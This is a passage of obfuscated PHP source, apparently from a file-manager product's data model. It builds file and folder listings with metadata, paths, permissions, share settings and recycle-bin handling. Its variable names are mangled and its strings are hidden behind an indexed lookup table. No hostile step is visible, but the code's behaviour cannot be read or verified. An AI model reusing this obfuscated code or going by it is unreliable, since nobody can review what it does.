{ $²ôÛ…¸× .= $èÂüŞÕã[518] . $±Şé£ßÀ[1]; } $Ğ÷»¢å¤ = array(); foreach ($ìÙÃçÕí as $×€ëéçÕ => $Ñ·ôìœ) { $Ğ÷»¢å¤[$èÂüŞÕã[511] . $×€ëéçÕ] = $Ñ·ôìœ; } $this->alias($èÂüŞÕã[519])->field($–ıÂˆ‹Õ)->limit($˜¸½¬­)->order($²ôÛ…¸×); $ÙŸŒŞòÚ = $this->join($³Ğïñî)->where($Ğ÷»¢å¤)->select(); if ($ÙŸŒŞòÚ) { $Öêğù²¡[$èÂüŞÕã[445]] = $ÙŸŒŞòÚ; } } protected function _makeOrder($ß™Úˆßç = false) { $ßÀ®¾×Ú =& $_SERVER[Ş­ğŠìÒ]; $Ë¢ñ£ = Model($ßÀ®¾×Ú[520])->get($ßÀ®¾×Ú[521]); $Èéô¥ · = Model($ßÀ®¾×Ú[520])->get($ßÀ®¾×Ú[522]); $îÏÃÖëŞ = array($ßÀ®¾×Ú[523] => $ßÀ®¾×Ú[524], $ßÀ®¾×Ú[525] => $ßÀ®¾×Ú[526]); $½­„¹‘€ = array($ßÀ®¾×Ú[32] => $ßÀ®¾×Ú[32], $ßÀ®¾×Ú[79] => $ßÀ®¾×Ú[79], $ßÀ®¾×Ú[169] => $ßÀ®¾×Ú[486], $ßÀ®¾×Ú[527] => $ßÀ®¾×Ú[527], $ßÀ®¾×Ú[528] => $ßÀ®¾×Ú[529], $ßÀ®¾×Ú[231] => $ßÀ®¾×Ú[231], $ßÀ®¾×Ú[88] => $ßÀ®¾×Ú[88]); $úíä‘İà = Input::get($ßÀ®¾×Ú[530], $ßÀ®¾×Ú[7], $Ë¢ñ£, array_keys($½­„¹‘€)); $ñ­şŠ† = Input::get($ßÀ®¾×Ú[531], $ßÀ®¾×Ú[7], $Èéô¥ ·, array_keys($îÏÃÖëŞ)); if (!in_array($úíä‘İà, array_keys($½­„¹‘€))) { $úíä‘İà = $ßÀ®¾×Ú[32]; } if (!in_array($ñ­şŠ†, array_keys($îÏÃÖëŞ))) { $úíä‘İà = $ßÀ®¾×Ú[523]; } if ($úíä‘İà == $ßÀ®¾×Ú[32]) { } $íâı²‰¥ = $ßÀ®¾×Ú[532] . $½­„¹‘€[$úíä‘İà] . $ßÀ®¾×Ú[53] . $îÏÃÖëŞ[$ñ­şŠ†]; $íâı²‰¥ = rtrim(trim($íâı²‰¥), $ßÀ®¾×Ú[50]); if ($ß™Úˆßç) { return array($íâı²‰¥, $îÏÃÖëŞ[$ñ­şŠ†]); } return $this->order($íâı²‰¥); } protected function _listDataApplyItem($şßã®¸Š, $Ê‡­ùûÏ = false) { $ÂŒ©ÅĞ° = array($şßã®¸Š); $this->_listDataApply($ÂŒ©ÅĞ°, $Ê‡­ùûÏ); return $ÂŒ©ÅĞ°[0]; } protected function _listDataApply(&$ö›”¿©², $¨¤ÍäŸ« = false) { $„¦ÈÍŠÒ =& $_SERVER[Ş­ğŠìÒ]; if (!$ö›”¿©²) { $ö›”¿©² = array(); return; } $Œ‹ÅíÎî = array_to_keyvalue($ö›”¿©², $„¦ÈÍŠÒ[12], $„¦ÈÍŠÒ[193]); $Œ‹ÅíÎî = array_unique($Œ‹ÅíÎî); $this->_listSourceCache($ö›”¿©²); if (!$¨¤ÍäŸ«) { $this->_listAppendMeta($ö›”¿©², $Œ‹ÅíÎî); $this->_listAppendFileMeta($ö›”¿©², $Œ‹ÅíÎî); $this->_listAppendChildren($ö›”¿©², $Œ‹ÅíÎî); } $this->_listAppendPath($ö›”¿©²); $this->_listAppendAuth($ö›”¿©²); $this->_listAppendSourceInfo($ö›”¿©², $Œ‹ÅíÎî); $this->_listAppendUser($ö›”¿©²); $this->_listFilterInfo($ö›”¿©², $¨¤ÍäŸ«); $this->_listAppendAuthSecret($ö›”¿©²); } protected function _listSourceCache($›ßÛˆƒ) { $¿èüõ”È =& $_SERVER[Ş­ğŠìÒ]; foreach ($›ßÛˆƒ as $¼£ÏŞŠ) { self::$cacheSourceInfo[$¿èüõ”È[533] . $¼£ÏŞŠ[$¿èüõ”È[193]]] = $¼£ÏŞŠ; } } protected function _listFilterInfo(&$‚éšÌÒ÷, $ß”–ñ³× = false) { $åĞïíÏÃ =& $_SERVER[Ş­ğŠìÒ]; foreach ($‚éšÌÒ÷ as &$åöÃ¬Ş§) { $åöÃ¬Ş§ = $this->pathInfoFilter($åöÃ¬Ş§); self::$cachePathInfo[$åĞïíÏÃ[534] . intval($ß”–ñ³×) . $åĞïíÏÃ[462] . $åöÃ¬Ş§[$åĞïíÏÃ[193]]] = $åöÃ¬Ş§; } unset($åöÃ¬Ş§); } protected function _listMake(&$Õ¸Êƒ•¯) { $¿Úà»› =& $_SERVER[Ş­ğŠìÒ]; $Õ¸Êƒ•¯[$¿Úà»›[85]] = array(); $Õ¸Êƒ•¯[$¿Úà»›[86]] = array(); foreach ($Õ¸Êƒ•¯[$¿Úà»›[445]] as $ˆá¾Ò÷™) { $‡ÑŠ¿å = $ˆá¾Ò÷™[$¿Úà»›[485]] == 1 ? $¿Úà»›[85] : $¿Úà»›[86]; $Õ¸Êƒ•¯[$‡ÑŠ¿å][] = $ˆá¾Ò÷™; } unset($Õ¸Êƒ•¯[$¿Úà»›[445]]); } protected function _listAppendMeta(&$Ù÷å ·», $Úı¢¦¸ô) { $Í¯„Óø× =& $_SERVER[Ş­ğŠìÒ]; $ºÆìÇÄ’ = array($Í¯„Óø×[491] => array($Í¯„Óø×[492], $Úı¢¦¸ô)); $¼Äò‚÷ò = Model($Í¯„Óø×[535])->field($Í¯„Óø×[536])->where($ºÆìÇÄ’)->select(); if (!$¼Äò‚÷ò) { return; } $°§˜¼‡¶ = array($Í¯„Óø×[537], $Í¯„Óø×[538], $Í¯„Óø×[517]); $ü÷æÏï = array(); foreach ($¼Äò‚÷ò as $ÓÂ–ÀÆ€) { if (!isset($ü÷æÏï[$ÓÂ–ÀÆ€[$Í¯„Óø×[193]]])) { $ü÷æÏï[$ÓÂ–ÀÆ€[$Í¯„Óø×[193]]] = array(); } if (in_array($ÓÂ–ÀÆ€[$Í¯„Óø×[97]], $°§˜¼‡¶)) { continue; } $ü÷æÏï[$ÓÂ–ÀÆ€[$Í¯„Óø×[193]]][$ÓÂ–ÀÆ€[$Í¯„Óø×[97]]] = $ÓÂ–ÀÆ€[$Í¯„Óø×[450]]; } foreach ($Ù÷å ·» as &$•œËÆì) { $•œËÆì[$Í¯„Óø×[539]] = !1; if (isset($ü÷æÏï[$•œËÆì[$Í¯„Óø×[193]]])) { $•œËÆì[$Í¯„Óø×[539]] = $ü÷æÏï[$•œËÆì[$Í¯„Óø×[193]]]; } if ($this->fileIsLock($•œËÆì) && $•œËÆì[$Í¯„Óø×[487]]) { $€µÃŞµ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $•œËÆì[$Í¯„Óø×[487]][$Í¯„Óø×[488]] = AuthModel::authDisable($•œËÆì[$Í¯„Óø×[487]][$Í¯„Óø×[488]], $€µÃŞµ); $•œËÆì[$Í¯„Óø×[487]][$Í¯„Óø×[540]][$Í¯„Óø×[487]] = $•œËÆì[$Í¯„Óø×[487]][$Í¯„Óø×[488]]; } } unset($•œËÆì); } protected function _listAppendFileMeta(&$óÓ´›®§, $ÃûÕ‚£İ) { $ùñ¾¡úÆ =& $_SERVER[Ş­ğŠìÒ]; $Ó†€Òƒ´ = array_to_keyvalue($óÓ´›®§, $ùñ¾¡úÆ[12], $ùñ¾¡úÆ[541]); $Ó†€Òƒ´ = array_filter(array_unique($Ó†€Òƒ´)); if (!$Ó†€Òƒ´) { return; } $·ı©›Ë = array($ùñ¾¡úÆ[542] => array($ùñ¾¡úÆ[492], $Ó†€Òƒ´)); $½ƒûÜ€ = $ùñ¾¡úÆ[543]; $…¯éÚó = Model($ùñ¾¡úÆ[544])->field($½ƒûÜ€)->where($·ı©›Ë)->select(); $…¯éÚó = array_to_keyvalue($…¯éÚó, $ùñ¾¡úÆ[541]); $­˜¡÷Š = Model($ùñ¾¡úÆ[545])->field($ùñ¾¡úÆ[546])->where($·ı©›Ë)->select(); $­˜¡÷Š = $­˜¡÷Š ? $­˜¡÷Š : array(); $—„®ù”½ = array(); foreach ($­˜¡÷Š as $ûïçÒ¸) { if (!isset($—„®ù”½[$ûïçÒ¸[$ùñ¾¡úÆ[541]]])) { $—„®ù”½[$ûïçÒ¸[$ùñ¾¡úÆ[541]]] = array(); } $—„®ù”½[$ûïçÒ¸[$ùñ¾¡úÆ[541]]][$ûïçÒ¸[$ùñ¾¡úÆ[97]]] = $ûïçÒ¸[$ùñ¾¡úÆ[450]]; } foreach ($óÓ´›®§ as &$ÃÔ„òñÚ) { $îø‚£™ = $ÃÔ„òñÚ[$ùñ¾¡úÆ[541]]; if (!$îø‚£™ || !is_array($…¯éÚó[$îø‚£™])) { continue; } $ÜİŸŒÍ’ = $…¯éÚó[$îø‚£™]; $ÜİŸŒÍ’[$ùñ¾¡úÆ[79]] = $ÃÔ„òñÚ[$ùñ¾¡úÆ[79]]; $ÜİŸŒÍ’[$ùñ¾¡úÆ[32]] = $ÃÔ„òñÚ[$ùñ¾¡úÆ[32]]; if (!$ÜİŸŒÍ’[$ùñ¾¡úÆ[547]]) { Model($ùñ¾¡úÆ[544])->fileMd5Check($ÜİŸŒÍ’); } if (!isset(self::$cacheFileInfo[$ùñ¾¡úÆ[548] . $îø‚£™])) { self::$cacheFileInfo[$ùñ¾¡úÆ[548] . $îø‚£™] = array_merge(array(), $ÜİŸŒÍ’); } unset($…¯éÚó[$îø‚£™][$ùñ¾¡úÆ[87]]); $ü«¤àé = isset($—„®ù”½[$îø‚£™]) && is_array($—„®ù”½[$îø‚£™]) ? $—„®ù”½[$îø‚£™] : array(); $ÃÔ„òñÚ[$ùñ¾¡úÆ[170]] = array_merge($ü«¤àé, $…¯éÚó[$îø‚£™]); if (isset($ÃÔ„òñÚ[$ùñ¾¡úÆ[170]][$ùñ¾¡úÆ[184]])) { $ÃÔ„òñÚ[$ùñ¾¡úÆ[184]] = json_decode($ÃÔ„òñÚ[$ùñ¾¡úÆ[170]][$ùñ¾¡úÆ[184]], !0); unset($ÃÔ„òñÚ[$ùñ¾¡úÆ[170]][$ùñ¾¡úÆ[184]]); } } unset($ÃÔ„òñÚ); } protected function _listAppendSourceInfo(&$•‘Ôìøş, $¾Ñ÷èÈ¥) { $¿°íÂ™ =& $_SERVER[Ş­ğŠìÒ]; $±ïİÁ¾ñ = Model($¿°íÂ™[549])->listData(); $åÒÊûßª = Model($¿°íÂ™[499])->listData(); $±¦œÂïï = Model($¿°íÂ™[489])->listData(); $›©¸‰´÷ = Model($¿°íÂ™[550])->listSimple(); $Ñîì±’ = array_to_keyvalue($±ïİÁ¾ñ, $¿°íÂ™[475]); $­ü™ñ É = array_to_keyvalue_group($åÒÊûßª, $¿°íÂ™[87], $¿°íÂ™[500]); $Æì«Áå = array_to_keyvalue($±¦œÂïï, $¿°íÂ™[87]); $ÖáØ§™ç = array_to_keyvalue_group($›©¸‰´÷, $¿°íÂ™[193]); foreach ($•‘Ôìøş as &$Ïñ°ÙÛ) { $Ïñ°ÙÛ[$¿°íÂ™[90]] = array($¿°íÂ™[551] => 0, $¿°íÂ™[552] => 0, $¿°íÂ™[553] => 0); if (isset($Æì«Áå[$Ïñ°ÙÛ[$¿°íÂ™[193]]])) { $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[554]] = 1; $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[555]] = $Æì«Áå[$Ïñ°ÙÛ[$¿°íÂ™[193]]][$¿°íÂ™[32]]; } if ($­ü™ñ É && $Ñîì±’ && isset($­ü™ñ É[$Ïñ°ÙÛ[$¿°íÂ™[193]]])) { $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[556]] = array(); foreach ($­ü™ñ É[$Ïñ°ÙÛ[$¿°íÂ™[193]]] as $…ë ²Â) { $²‹äé® = $Ñîì±’[$…ë ²Â]; $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[556]][] = array($¿°íÂ™[557] => $²‹äé®[$¿°íÂ™[475]], $¿°íÂ™[494] => $²‹äé®[$¿°íÂ™[32]], $¿°íÂ™[558] => $²‹äé®[$¿°íÂ™[559]]); } } if ($ÖáØ§™ç && isset($ÖáØ§™ç[$Ïñ°ÙÛ[$¿°íÂ™[193]]])) { $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[560]] = array(); foreach ($ÖáØ§™ç[$Ïñ°ÙÛ[$¿°íÂ™[193]]] as $»ÓÆ…¦) { $µæğŒú® = $¿°íÂ™[561]; if ($»ÓÆ…¦[$¿°íÂ™[562]] == $¿°íÂ™[91]) { $µæğŒú® .= $¿°íÂ™[563]; } $Ïñ°ÙÛ[$¿°íÂ™[90]][$¿°íÂ™[560]] = array_field_key($»ÓÆ…¦, explode($¿°íÂ™[50], $µæğŒú®)); } } } unset($Ïñ°ÙÛ); return $•‘Ôìøş; } protected function _listAppendChildren(&$¤¶¤—¯‡, $ºÉøÎ…) { $¶”­Ûİ­ =& $_SERVER[Ş­ğŠìÒ]; $öáûèØä = array(); $¦ÀÖá‹ = array($¶”­Ûİ­[239] => 0, $¶”­Ûİ­[240] => 0); foreach ($¤¶¤—¯‡ as &$¿œ´Ì­·) { if (!$¿œ´Ì­·[$¶”­Ûİ­[485]]) { continue; } $öáûèØä[] = $¿œ´Ì­·[$¶”­Ûİ­[193]]; } unset($¿œ´Ì­·); if (!$öáûèØä) { return; } $ŸşØ€×Ş = array($¶”­Ûİ­[192] => array($¶”­Ûİ­[7], $öáûèØä), $¶”­Ûİ­[505] => 0); $Ùß»¼Ñ = array($¶”­Ûİ­[192], $¶”­Ûİ­[485], $¶”­Ûİ­[564] => $¶”­Ûİ­[565]); $ËŞ³÷¡‹ = $this->field($Ùß»¼Ñ)->where($ŸşØ€×Ş)->group($¶”­Ûİ­[566])->select(); $»ç„äÈµ = array(); foreach ($ËŞ³÷¡‹ as $ÎöúÇÜ) { $°Î¥ÙÛç = $ÎöúÇÜ[$¶”­Ûİ­[192]]; $öŠÍÇş“ = $ÎöúÇÜ[$¶”­Ûİ­[485]] == $¶”­Ûİ­[91] ? $¶”­Ûİ­[240] : $¶”­Ûİ­[239]; if (!isset($»ç„äÈµ[$°Î¥ÙÛç])) { $»ç„äÈµ[$°Î¥ÙÛç] = array($¶”­Ûİ­[239] => 0, $¶”­Ûİ­[240] => 0); } $»ç„äÈµ[$°Î¥ÙÛç][$öŠÍÇş“] += $ÎöúÇÜ[$¶”­Ûİ­[565]]; } foreach ($¤¶¤—¯‡ as &$¿œ´Ì­·) { if (!$¿œ´Ì­·[$¶”­Ûİ­[485]]) { continue; } $îœ÷¨¸ = is_array($»ç„äÈµ[$¿œ´Ì­·[$¶”­Ûİ­[193]]]) ? $»ç„äÈµ[$¿œ´Ì­·[$¶”­Ûİ­[193]]] : $¦ÀÖá‹; $¿œ´Ì­·[$¶”­Ûİ­[240]] = $îœ÷¨¸[$¶”­Ûİ­[240]]; $¿œ´Ì­·[$¶”­Ûİ­[239]] = $îœ÷¨¸[$¶”­Ûİ­[239]]; unset($¿œ´Ì­·[$¶”­Ûİ­[486]]); } unset($¿œ´Ì­·); } protected function _listAppendAuth(&$ÜÃ¢åº€) { $’‡ÔËÜ =& $_SERVER[Ş­ğŠìÒ]; $·†’¤½Á = array(); foreach ($ÜÃ¢åº€ as $™ÍæÏ¦¨) { if ($™ÍæÏ¦¨[$’‡ÔËÜ[190]] == self::TYPE_GROUP) { $·†’¤½Á[] = $™ÍæÏ¦¨[$’‡ÔËÜ[193]]; } } if (!$·†’¤½Á) { return; } $š‚‰äÚ = array_to_keyvalue($ÜÃ¢åº€, $’‡ÔËÜ[193]); $÷îš˜ÑÔ = Model($’‡ÔËÜ[567])->getSourceList($·†’¤½Á, $š‚‰äÚ); $–§¶­› = KodUser::isRoot(); foreach ($ÜÃ¢åº€ as $Ùö’ëø¡ => &$™ÍæÏ¦¨) { $™ÍæÏ¦¨[$’‡ÔËÜ[487]] = $÷îš˜ÑÔ[$™ÍæÏ¦¨[$’‡ÔËÜ[193]]]; if (!$™ÍæÏ¦¨[$’‡ÔËÜ[487]] && $™ÍæÏ¦¨[$’‡ÔËÜ[190]] == self::TYPE_GROUP) { $™ÍæÏ¦¨[$’‡ÔËÜ[487]] = Action($’‡ÔËÜ[568])->pathGroupAuthMake($™ÍæÏ¦¨[$’‡ÔËÜ[569]]); if (!$™ÍæÏ¦¨[$’‡ÔËÜ[487]] && !$–§¶­›) { $™ÍæÏ¦¨[$’‡ÔËÜ[233]] = !1; $™ÍæÏ¦¨[$’‡ÔËÜ[232]] = !1; } } if ($™ÍæÏ¦¨[$’‡ÔËÜ[487]]) { $™ÍæÏ¦¨[$’‡ÔËÜ[233]] = AuthModel::authCheckEdit($™ÍæÏ¦¨[$’‡ÔËÜ[487]][$’‡ÔËÜ[488]]); $™ÍæÏ¦¨[$’‡ÔËÜ[232]] = AuthModel::authCheckView($™ÍæÏ¦¨[$’‡ÔËÜ[487]][$’‡ÔËÜ[488]]); } $this->groupPathDisplay($™ÍæÏ¦¨); } unset($™ÍæÏ¦¨); } public function _listAppendAuthSecret(&$åï«´õ) { $â¡—ÓÒ¯ =& $_SERVER[Ş­ğŠìÒ]; if (Model($â¡—ÓÒ¯[508])->get($â¡—ÓÒ¯[570]) != $â¡—ÓÒ¯[91]) { return; } static $£ÍÔ—Ÿ‚ = false; if (!$£ÍÔ—Ÿ‚) { $œà¯”€ = Model($â¡—ÓÒ¯[571]); $Ôô©Øó = Model($â¡—ÓÒ¯[572]); $£ÍÔ—Ÿ‚ = $Ôô©Øó->listData(); $£ÍÔ—Ÿ‚ = array_to_keyvalue($£ÍÔ—Ÿ‚, $â¡—ÓÒ¯[193]); $íüû¾İó = json_decode(Model($â¡—ÓÒ¯[508])->get($â¡—ÓÒ¯[573]), !0); $íüû¾İó = array_to_keyvalue($íüû¾İó, $â¡—ÓÒ¯[475]); foreach ($£ÍÔ—Ÿ‚ as $İø‰Ü‚ş => $“Ê©š‰¦) { $äÀ„Œô‹ = $íüû¾İó[$“Ê©š‰¦[$â¡—ÓÒ¯[574]]]; if (!$äÀ„Œô‹) { $Ôô©Øó->remove($“Ê©š‰¦[$â¡—ÓÒ¯[475]]); unset($£ÍÔ—Ÿ‚[$İø‰Ü‚ş]); continue; } $–¤”šä = $œà¯”€->listData($äÀ„Œô‹[$â¡—ÓÒ¯[487]]); if (!$–¤”šä) { $Ôô©Øó->remove($“Ê©š‰¦[$â¡—ÓÒ¯[475]]); unset($£ÍÔ—Ÿ‚[$İø‰Ü‚ş]); continue; } $“Ê©š‰¦[$â¡—ÓÒ¯[487]] = $–¤”šä; $“Ê©š‰¦[$â¡—ÓÒ¯[575]] = $äÀ„Œô‹; $“Ê©š‰¦[$â¡—ÓÒ¯[576]] = Model($â¡—ÓÒ¯[577])->getInfoSimpleOuter($“Ê©š‰¦[$â¡—ÓÒ¯[527]]); $£ÍÔ—Ÿ‚[$İø‰Ü‚ş] = $“Ê©š‰¦; } } $¹»­ó¼ = USER_ID; $É‘¢şœ = array(); $›”¹şÍ = $this->_listAppendPath($É‘¢şœ, !0); foreach ($åï«´õ as $İø‰Ü‚ş => &$“Ê©š‰¦) { if (!is_array($“Ê©š‰¦[$â¡—ÓÒ¯[487]])) { continue; } if ($“Ê©š‰¦[$â¡—ÓÒ¯[190]] != $â¡—ÓÒ¯[578]) { continue; } if (isset($£ÍÔ—Ÿ‚[$“Ê©š‰¦[$â¡—ÓÒ¯[193]]])) { $ıŒüõË = $£ÍÔ—Ÿ‚[$“Ê©š‰¦[$â¡—ÓÒ¯[193]]]; if (!is_array($“Ê©š‰¦[$â¡—ÓÒ¯[539]])) { $“Ê©š‰¦[$â¡—ÓÒ¯[539]] = array(); } $“Ê©š‰¦[$â¡—ÓÒ¯[539]][$â¡—ÓÒ¯[579]] = $ıŒüõË[$â¡—ÓÒ¯[574]]; $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[580]] = $ıŒüõË; $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[581]] = $“Ê©š‰¦[$â¡—ÓÒ¯[582]]; $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[583]] = $â¡—ÓÒ¯[91]; if ($ıŒüõË[$â¡—ÓÒ¯[527]] != $¹»­ó¼) { $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[488]] = $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[488]] & $ıŒüõË[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[487]]; } continue; } $Œ“¨¥ë„ = $this->parentLevelArray($“Ê©š‰¦[$â¡—ÓÒ¯[584]]); $€ÇÎ¸Õ = array_reverse($Œ“¨¥ë„); foreach ($€ÇÎ¸Õ as $Éİó¢ò™ => $âö®•‚½) { if (!isset($£ÍÔ—Ÿ‚[$âö®•‚½])) { continue; } $ıŒüõË = $£ÍÔ—Ÿ‚[$âö®•‚½]; $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[580]] = $ıŒüõË; if ($ıŒüõË[$â¡—ÓÒ¯[527]] != $¹»­ó¼) { $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[488]] = $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[488]] & $ıŒüõË[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[487]]; } $ÖˆÎ¦«‚ = $â¡—ÓÒ¯[12]; $åÈ™æõ = count($Œ“¨¥ë„) - $Éİó¢ò™; for ($á„ì„Õ = 0; $á„ì„Õ < $åÈ™æõ; $á„ì„Õ++) { if (!isset($›”¹şÍ[$Œ“¨¥ë„[$á„ì„Õ]])) { $ÖˆÎ¦«‚ = $â¡—ÓÒ¯[12]; break; } $ÖˆÎ¦«‚ = $ÖˆÎ¦«‚ . rtrim($›”¹şÍ[$Œ“¨¥ë„[$á„ì„Õ]], $â¡—ÓÒ¯[8]) . $â¡—ÓÒ¯[8]; } $“Ê©š‰¦[$â¡—ÓÒ¯[487]][$â¡—ÓÒ¯[581]] = rtrim($ÖˆÎ¦«‚, $â¡—ÓÒ¯[8]) . $â¡—ÓÒ¯[8]; break; } } unset($“Ê©š‰¦); } public function groupPathDisplay(&$Ê¥¢ìÊá) { $ã¤ûƒ–“ =& $_SERVER[Ş­ğŠìÒ]; if ($Ê¥¢ìÊá[$ã¤ûƒ–“[190]] != self::TYPE_GROUP) { return; } $¹ÛŒùù£ = Model($ã¤ûƒ–“[585])->getInfo($Ê¥¢ìÊá[$ã¤ûƒ–“[569]]); $Ù­ü¥ïË = $this->parentLevelArray($¹ÛŒùù£[$ã¤ûƒ–“[584]]); $ïâÎÛÓ› = $ã¤ûƒ–“[12]; foreach ($Ù­ü¥ïË as $øù„‚…ò) { $–‰ò¸šÏ = Model($ã¤ûƒ–“[585])->getInfo($øù„‚…ò); $ïâÎÛÓ› .= $–‰ò¸šÏ[$ã¤ûƒ–“[90]][$ã¤ûƒ–“[193]] . $ã¤ûƒ–“[50]; } $Ê¥¢ìÊá[$ã¤ûƒ–“[586]] = $¹ÛŒùù£[$ã¤ûƒ–“[192]]; $Ê¥¢ìÊá[$ã¤ûƒ–“[587]] = $¹ÛŒùù£[$ã¤ûƒ–“[584]]; $Ê¥¢ìÊá[$ã¤ûƒ–“[588]] = $¹ÛŒùù£[$ã¤ûƒ–“[589]]; $Ê¥¢ìÊá[$ã¤ûƒ–“[590]] = $ïâÎÛÓ› . $¹ÛŒùù£[$ã¤ûƒ–“[90]][$ã¤ûƒ–“[193]]; } protected function _listAppendPath(&$İ€ùËşé, $—‹§Ä´“ = false) { $Ç«ûŒäº =& $_SERVER[Ş­ğŠìÒ]; static $éÖúñ¸â = array(); $–ŠƒêŞ• = array(); $ÈÕßà = array(); if ($—‹§Ä´“) { return $éÖúñ¸â; } foreach ($İ€ùËşé as &$•®ø¦õÑ) { $ûˆƒÕª¨ = $•®ø¦õÑ[$Ç«ûŒäº[193]]; if ($•®ø¦õÑ[$Ç«ûŒäº[485]] == $Ç«ûŒäº[91] && $•®ø¦õÑ[$Ç«ûŒäº[192]] != 0) { $éÖúñ¸â[$ûˆƒÕª¨] = $•®ø¦õÑ[$Ç«ûŒäº[32]]; } if ($•®ø¦õÑ[$Ç«ûŒäº[485]] == $Ç«ûŒäº[91] && $•®ø¦õÑ[$Ç«ûŒäº[192]] == 0) { $éÖúñ¸â[$ûˆƒÕª¨] = $this->_listAppendPathRoot($•®ø¦õÑ, array()); } if (isset($ÈÕßà[$•®ø¦õÑ[$Ç«ûŒäº[584]]])) { continue; } $ÈÕßà[$•®ø¦õÑ[$Ç«ûŒäº[584]]] = !0; $Öº«ƒŒ£ = $this->parentLevelArray($•®ø¦õÑ[$Ç«ûŒäº[584]]); foreach ($Öº«ƒŒ£ as $£Şöí‚© => $óòüË­ï) { if (isset($éÖúñ¸â[$óòüË­ï])) { continue; } if ($£Şöí‚© == 0) { $éÖúñ¸â[$óòüË­ï] = $this->_listAppendPathRoot($•®ø¦õÑ, $Öº«ƒŒ£); } if ($£Şöí‚© != 0) { $–ŠƒêŞ•[] = $óòüË­ï; } } } unset($•®ø¦õÑ); $–ŠƒêŞ• = array_unique($–ŠƒêŞ•); if (count($–ŠƒêŞ•) > 0) { $…ÅŒ¹á = array($Ç«ûŒäº[491] => array($Ç«ûŒäº[492], $–ŠƒêŞ•)); if (count($–ŠƒêŞ•) == 1) { $å÷õíÜô = $this->sourceInfo($–ŠƒêŞ•[0]); $øÚÚÎ‚Á = is_array($å÷õíÜô) ? array($å÷õíÜô) : !1; } else { $øÚÚÎ‚Á = $this->field($Ç«ûŒäº[591])->where($…ÅŒ¹á)->select(); } if (!$øÚÚÎ‚Á) { $øÚÚÎ‚Á = array(); } foreach ($øÚÚÎ‚Á as $Áí‚Âñ´) { $éÖúñ¸â[$Áí‚Âñ´[$Ç«ûŒäº[193]]] = $Áí‚Âñ´[$Ç«ûŒäº[32]]; } } $²¶ï²ï = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¤“ƒüï÷ = array(); foreach ($İ€ùËşé as &$•®ø¦õÑ) { $Š¥ÒĞ›€ = $•®ø¦õÑ[$Ç«ûŒäº[584]]; $È¢ìĞ…µ = $Ç«ûŒäº[12]; if (isset($¤“ƒüï÷[$Š¥ÒĞ›€])) { $È¢ìĞ…µ = $¤“ƒüï÷[$Š¥ÒĞ›€]; } else { $Öº«ƒŒ£ = $this->parentLevelArray($•®ø¦õÑ[$Ç«ûŒäº[584]]); foreach ($Öº«ƒŒ£ as $£Şöí‚© => $óòüË­ï) { if (isset($éÖúñ¸â[$óòüË­ï])) { $È¢ìĞ…µ .= $éÖúñ¸â[$óòüË­ï] . $Ç«ûŒäº[8]; } } $¤“ƒüï÷[$Š¥ÒĞ›€] = $È¢ìĞ…µ; } $È¢ìĞ…µ .= $•®ø¦õÑ[$Ç«ûŒäº[32]]; if ($•®ø¦õÑ[$Ç«ûŒäº[485]] == $Ç«ûŒäº[91]) { $È¢ìĞ…µ .= $Ç«ûŒäº[8]; } $•®ø¦õÑ[$Ç«ûŒäº[582]] = str_replace($Ç«ûŒäº[592], $Ç«ûŒäº[8], $È¢ìĞ…µ); if ($•®ø¦õÑ[$Ç«ûŒäº[192]] == $Ç«ûŒäº[228]) { $•®ø¦õÑ[$Ç«ûŒäº[32]] = trim($éÖúñ¸â[$•®ø¦õÑ[$Ç«ûŒäº[193]]], $Ç«ûŒäº[8]); $•®ø¦õÑ[$Ç«ûŒäº[582]] = $•®ø¦õÑ[$Ç«ûŒäº[32]] . $Ç«ûŒäº[8]; } if (intval($•®ø¦õÑ[$Ç«ûŒäº[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($•®ø¦õÑ, $Öº«ƒŒ£, $²¶ï²ï); } } unset($•®ø¦õÑ); return $İ€ùËşé; } private function _listAppendPathRecycle(&$‰ûÖ²çê, $•é‚°Äú, $Ôù¾±¡Ô) { $Î‡’÷ =& $_SERVER[Ş­ğŠìÒ]; if (!in_array($Ôù¾±¡Ô, $•é‚°Äú) && $‰ûÖ²çê[$Î‡’÷[193]] != $Ôù¾±¡Ô) { return; } $´Â”Ñ¨· = explode($Î‡’÷[8], trim($‰ûÖ²çê[$Î‡’÷[582]], $Î‡’÷[8])); $æÁ‚‹¤£ = implode($Î‡’÷[8], array_slice($´Â”Ñ¨·, 2)); $‰ûÖ²çê[$Î‡’÷[582]] = $Î‡’÷[8] . LNG($Î‡’÷[593]) . $Î‡’÷[8] . ltrim($æÁ‚‹¤£, $Î‡’÷[8]); $‰ûÖ²çê[$Î‡’÷[584]] = $Î‡’÷[594] . implode($Î‡’÷[50], array_slice($•é‚°Äú, 1)) . $Î‡’÷[50]; if ($‰ûÖ²çê[$Î‡’÷[193]] == $Ôù¾±¡Ô) { $‰ûÖ²çê[$Î‡’÷[584]] = $Î‡’÷[594]; $‰ûÖ²çê[$Î‡’÷[192]] = $Î‡’÷[228]; $‰ûÖ²çê[$Î‡’÷[32]] = LNG($Î‡’÷[593]); } $‰ûÖ²çê[$Î‡’÷[595]] = $Î‡’÷[596]; } protected function _listAppendPathRoot(&$ÌáÅÊ‹µ, $—·Éëƒ•) { $°æ‰Ò =& $_SERVER[Ş­ğŠìÒ]; static $Şİˆ±‚Ã = false; $±¢øóŠ‹ = $°æ‰Ò[12]; if ($ÌáÅÊ‹µ[$°æ‰Ò[190]] == 